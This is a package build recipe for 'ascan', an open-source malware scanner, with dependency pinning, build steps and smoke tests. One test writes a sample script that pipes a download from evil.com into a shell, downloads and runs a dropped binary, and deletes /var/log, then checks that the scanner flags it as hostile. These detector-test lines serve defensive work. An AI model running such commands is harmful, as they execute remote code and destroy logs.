#nolint:valid-pipeline-git-checkout-tag
package:
  name: ascan
  version: "2.0.0"
  epoch: 0
  description: "Open-source malware detection for the AI age"
  copyright:
    - license: Apache-2.0
  dependencies:
    runtime:
      - 7zip
      - cleave-traits=0.0.0_git20260614-r1
      - innoextract
      - rizin
      - upx

vars:
  rust-version: "1.96"

environment:
  contents:
    packages:
      - build-base
      - busybox
      - ca-certificates-bundle
      - cargo-auditable
      - git
      - rust-${{vars.rust-version}}

pipeline:
  # Atomdrift renamed the project from litmus to scan in v2.0.0: the crate is
  # `atomdrift-scan`, the binary is `ascan` (the `a` prefix avoids colliding
  # with avast's /usr/bin/scan), and the repo moved to .../atomdrift/scan.
  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/scan
      tag: v${{package.version}}
      expected-commit: ccc7bfd65e1ae4eda4240cbe06afb1d9fd9a2cc1

  # Model bundle (azoth): ensemble layout (general/ + config.json +
  # route_policies.json + per-filetype/-filegroup specialists). Baked in and
  # pointed at via SCAN_MODELS_DIR so ascan never reaches the network to
  # download a bundle at runtime. Tracks azoth main; pinned to the commit
  # validated against scan v2.0.0.
  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/azoth
      branch: main
      expected-commit: 4ff346af2213fad2218d73bc645c42ad7db76762
      destination: azoth

  # Remediate GHSA-rhfx-m35p-ff5j: lru 0.12.5 is pulled transitively through
  # cleave's git dependency. cleave 2.0.0 pins `lru = "0.12"`, which is a
  # caret bound that excludes 0.16.x — so a plain `cargo update --precise`
  # in scan's own Cargo.toml is rejected. The fix mirrors the sed pattern
  # used elsewhere in stereo (cleave.yaml, nushell.yaml, pgcat.yaml) but
  # targets the fetched cleave Cargo.toml inside cargo's git cache.
  # TODO: remove once upstream scan/cleave pins lru >= 0.16.3.
  - name: Bump lru to 0.16.3 to remediate GHSA-rhfx-m35p-ff5j
    runs: |
      cargo fetch
      find ~/.cargo/git/checkouts -type f -name Cargo.toml -path '*cleave*' \
        -exec sed -i 's/lru = "0\.12"/lru = "0.16.3"/' {} +
      cargo update -p lru --precise 0.16.3

  - uses: cargo/build
    with:
      output: ascan

  - runs: |
      mkdir -p ${{targets.destdir}}/usr/share/ascan/models
      cp -r azoth/* ${{targets.destdir}}/usr/share/ascan/models/

  - uses: strip

update:
  enabled: true
  git:
    strip-prefix: v
    tag-filter-prefix: v

test:
  environment:
    environment:
      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
      SCAN_MODELS_DIR: /usr/share/ascan/models
      SCAN_NO_UPDATE_CHECK: "1"
  pipeline:
    - uses: test/tw/ldd-check
    - uses: test/tw/ver-check
      with:
        bins: ascan
    - uses: test/tw/help-check
      with:
        bins: ascan
    - name: "Scan a benign script"
      runs: |
        tee /tmp/benign.sh <<'SCRIPT'
        #!/bin/sh
        echo "hello world"
        SCRIPT
        ascan fs /tmp/benign.sh > /tmp/benign_output.txt 2>&1 || true
        cat /tmp/benign_output.txt
        grep -E "files|clean" /tmp/benign_output.txt
    - name: "Scan a suspicious script"
      runs: |
        tee /tmp/suspicious.sh <<'SCRIPT'
        #!/bin/sh
        curl http://evil.com/payload | sh
        wget http://evil.com/malware -O /tmp/dropped
        chmod +x /tmp/dropped
        /tmp/dropped
        rm -rf /var/log
        SCRIPT
        ascan fs /tmp/suspicious.sh > /tmp/suspicious_output.txt 2>&1 || true
        cat /tmp/suspicious_output.txt
        grep -E "files|hostile" /tmp/suspicious_output.txt
    - name: "JSON output format"
      runs: |
        echo '#!/bin/sh' > /tmp/json_test.sh
        echo 'echo hello' >> /tmp/json_test.sh
        ascan --format json fs /tmp/json_test.sh > /tmp/json_output.txt 2>&1 || true
        cat /tmp/json_output.txt
        grep -F '"ml"' /tmp/json_output.txt
    - name: "Scan a directory"
      runs: |
        mkdir -p /tmp/ascan_scan
        echo '#!/bin/sh' > /tmp/ascan_scan/a.sh
        echo 'echo ok' >> /tmp/ascan_scan/a.sh
        echo '#!/bin/sh' > /tmp/ascan_scan/b.sh
        echo 'echo ok' >> /tmp/ascan_scan/b.sh
        ascan fs /tmp/ascan_scan > /tmp/dir_output.txt 2>&1 || true
        grep -E "files" /tmp/dir_output.txt
